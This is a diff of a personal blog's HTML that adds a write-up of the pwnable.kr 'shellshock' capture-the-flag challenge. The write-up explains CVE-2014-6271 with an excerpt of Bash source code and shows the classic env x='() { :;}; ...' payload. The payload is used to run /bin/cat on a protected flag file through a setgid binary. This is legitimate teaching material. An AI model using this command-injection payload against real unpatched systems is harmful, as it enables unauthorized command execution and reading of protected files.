@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-	<meta name="generator" content="Hugo 0.79.0" />
     <meta charset="utf-8">
     <meta name="HandheldFriendly" content="True">
     <meta name="MobileOptimized" content="320">
@@ -16,10 +15,10 @@
     <title>
       
       
-         Before Dawn 
+         Writeup: shellshock 
       
     </title>
-    <link rel="canonical" href="https://chuang76.github.io/">
+    <link rel="canonical" href="https://chuang76.github.io/posts/shellshock/">
 
     <style>
   * {
@@ -409,7 +408,6 @@
 </style>
 
 
-    <link rel="alternate" type="application/rss+xml" href="https://chuang76.github.io/index.xml" title="Before Dawn" />
     </head>
 
   <body>
@@ -422,94 +420,84 @@
 
 
 <section id=content>
-  <ul class=posts_listing>
+  <h1> Writeup: shellshock </h1>
+
+  
+    <div id=sub-header>
+      December 2020 
+    </div>
+  
+
+  <div class="entry-content">
+    <p>This is a challenge in <a href="https://pwnable.kr/">pwnable.kr</a>. The home directory contains the following files:</p>
+<pre><code>shellshock@pwnable:~$ ls -al
+total 980
+drwxr-x---   5 root shellshock       4096 Oct 23  2016 .
+drwxr-xr-x 116 root root             4096 Apr 17  2020 ..
+-r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash
+d---------   2 root root             4096 Oct 12  2014 .bash_history
+-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
+dr-xr-xr-x   2 root root             4096 Oct 12  2014 .irssi
+drwxr-xr-x   2 root root             4096 Oct 23  2016 .pwntools-cache
+-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
+-r--r--r--   1 root root              188 Oct 12  2014 shellshock.c
+</code></pre><p>The source code can be displayed as follows.</p>
+<pre><code>shellshock@pwnable:~$ cat shellshock.c
+#include &lt;stdio.h&gt;
+int main(){
+      setresuid(getegid(), getegid(), getegid());
+      setresgid(getegid(), getegid(), getegid());
+      system(&quot;/home/shellshock/bash -c 'echo shock_me'&quot;);
+      return 0;
+}
+</code></pre><p>Originally, the permission of the executable shellshock is <code>r-xr-sr-x</code>, that is, our permission (other) is r-x. The function setresuid() is used to set the real, effective, and saved user ID; setresuid() has analogous function that set the real, effective, and saved group ID. Since shellshock belongs to the group shellshock_pwn, after executing the setresuid and setresgid function, we are able to own the same permission as group shellshcok_pwn.</p>
+<p><a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">Shellshock</a> is a vulnerability in the Bash shell, it is first published in 2014. According to the report <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271">CVE-2014-6271</a>, attackers can exploit it with a crafted environment variable. The problem is about parse logic, it is located in <a href="http://git.savannah.gnu.org/cgit/bash.git/tree/variables.c?id=ac50fbac377e32b98d2de396f016ea81e8ee9961#n315">variables.c</a>. Here is the part of source code.</p>
+<pre><code>void initialize_shell_variables (env, privmode)
+     char **env;
+     int privmode;
+{
+    ...
+    for (string_index = 0; string = env[string_index++]; )
+    	...
+      	/* If exported function, define it now.  Don't import functions from
+	 the environment in privileged mode. */
+      	if (privmode == 0 &amp;&amp; read_but_dont_execute == 0 &amp;&amp; STREQN (&quot;() {&quot;, string, 4))
+      	{
+            ...
+            if (posixly_correct == 0 || legal_identifier (name))
+                parse_and_execute (temp_string, name, SEVAL_NONINT|SEVAL_NOHIST);
+</code></pre><p>As you can see, STREQN (&quot;() {&quot;, string, 4) means the program check whether the first 4-byte of the string is &ldquo;() {&rdquo; or not. If the string starts at &ldquo;() {&rdquo;, the shell program will regard it as an environment variable. However, it may cause a security problem since more general strings are allowed to be executed.</p>
+<p>For example, the string can contain two commands which are separated by a semicolon (;) symbol, then both the commands will be executed.</p>
+<pre><code>env x='() { :;}; echo vulnerable' bash -c &quot;echo this is a test&quot;
+                 ^^^^^^^^^^^^^^^                                arbitrary command
+</code></pre><p>Now, let&rsquo;s check if Shellshock vulnerability exists in the challenge. Obviously, the bash provided is not safe.</p>
+<pre><code>shellshock@pwnable:~$ env x='() { :;}; echo velnerable' ./bash -c &quot;echo this is a test&quot;
+velnerable
+this is a test
+</code></pre><p>So we can exploit it and get the flag.</p>
+<pre><code>shellshock@pwnable:~$ env x='() { :;}; /bin/cat flag' ./shellshock
+only if I knew CVE-2014-6271 ten years ago..!!
+Segmentation fault (core dumped)
+</code></pre><!-- raw HTML omitted -->
+<h2 id="reference">Reference</h2>
+<ol>
+<li>Computer &amp; Internet Security: A Hands-on Approach, Wenliang Du.</li>
+<li>CVE-2014-6271 (Shellshock): The story of a permissive parser, Portcullis Labs.</li>
+</ol>
+
+  </div>
+
+  <div id=links>
     
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/shellshock/">Writeup: shellshock</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
+      <a href="https://chuang76.github.io/posts/users_and_groups/">&laquo;&nbsp;Users and Groups</a>
     
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/users_and_groups/">Users and Groups</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
     
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/mistake/">Writeup: mistake</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
-    
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/leg/">Writeup: leg</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
-    
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/input/">Writeup: input</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
-    
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/passcode/">Writeup: passcode</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
-    
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/payload/">Walkthrough: payload</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
-    
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/lazy_binding/">Lazy binding</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
-    
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/toefl/">Toefl preparation</a></h2>
-        <div class=date>
-          
-            November 2020
-          
-        </div>
-      </li>
-    
-  </ul>
+  </div>
 </section>
 
   
 </body>
 </html>
+
 
 
